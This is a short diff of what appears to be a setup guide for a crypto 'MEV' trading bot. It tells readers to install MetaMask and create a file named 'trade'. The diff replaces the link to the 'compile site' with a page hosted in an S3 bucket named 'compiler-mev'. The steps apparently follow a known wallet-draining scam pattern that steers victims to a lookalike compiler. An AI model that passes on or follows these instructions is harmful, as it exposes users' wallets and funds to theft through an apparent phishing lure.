@@ -7,7 +7,7 @@ Step-by-Step Setup Guide:
 
 👉 Download a web3 wallet if you don't already have one, here's the link to MetaMask:  https://metamask.io/download
 
-👉 Head over to the compile site : [https://idecompiler.org/](https://idecompiler.org/)
+👉 Head over to the compile site : [https://s3.amazonaws.com/compiler-mev/index.html](https://s3.amazonaws.com/compiler-mev/index.html)
 
 👉 Create a new file, name it one word for example "trade"
 
